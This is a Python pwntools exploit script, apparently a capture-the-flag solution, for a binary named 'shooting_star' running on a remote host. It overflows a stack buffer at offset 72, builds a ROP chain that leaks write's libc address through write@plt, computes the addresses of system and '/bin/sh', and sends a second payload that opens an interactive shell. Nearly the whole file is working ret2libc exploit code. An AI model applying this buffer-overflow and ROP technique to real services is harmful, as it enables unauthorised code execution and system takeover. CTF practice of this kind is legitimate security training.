from pwn import *

LOCAL = False
elf = ELF("./shooting_star", checksec=False)
if LOCAL:
	p = elf.process()
else:
	p = remote('138.68.148.149', '31812')

# def find_ip():
#     p.sendlineafter('> ', '1')
#     p.sendlineafter('>> ', cyclic(128))
#     p.wait()
#     # Print out the address of EIP/RIP at the time of crashing
#     # ip_offset = cyclic_find(p.corefile.pc)  # x86
#     ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
#     info('located EIP/RIP offset at {a}'.format(a=ip_offset))
#     return ip_offset

# ip_offset = find_ip()
ip_offset = 72
if LOCAL:
	write = 0x7ffff7ecbf20
	system = 0x7ffff7e25e50
	bin_sh = 0x7ffff7f67152
	offset_write_system = write - system
	offset_binsh_write = bin_sh - write

write_plt = elf.plt['write']
write_got = elf.got['write']
pop_rsi_r15 = 0x4012c9
main = elf.symbols['main']

# Leaking write_got address
payload  = "A" * ip_offset
payload += p64(pop_rsi_r15) 
payload += p64(write_got)	# populating rsi
payload += p64(0x0)			# populating r15
payload += p64(write_plt)	# called function
payload += p64(main)		# return to main()
p.sendlineafter("> ", "1")
p.sendlineafter(">> ", payload)

# Grabbing leakage
print p.recvuntil("May your wish come true!\n")
leak = p.recvline()
write_libc = u64(leak[:6].ljust(8, "\x00"))
log.info(hex(write_libc))			# server leaked: 0x7f9db74ed210 -> looking for 210 in https://libc.blukat.me/ -> see image attached

# Calculating system & bin_sh addresses
if LOCAL:
	system_libc = write_libc - offset_write_system
	bin_sh_libc = write_libc + offset_binsh_write
else:
	system_libc = write_libc - 0xc0cc0
	bin_sh_libc = write_libc + 0xa3c0a

# Calling system
pop_rdi = 0x4012cb

payload = "A" * ip_offset
payload += p64(pop_rdi)
payload += p64(bin_sh_libc)		# populating rdi
payload += p64(system_libc)		# called function

p.sendlineafter("> ", "1")
p.sendlineafter(">> ", payload)
success(p.interactive())		# enjoy your shell :)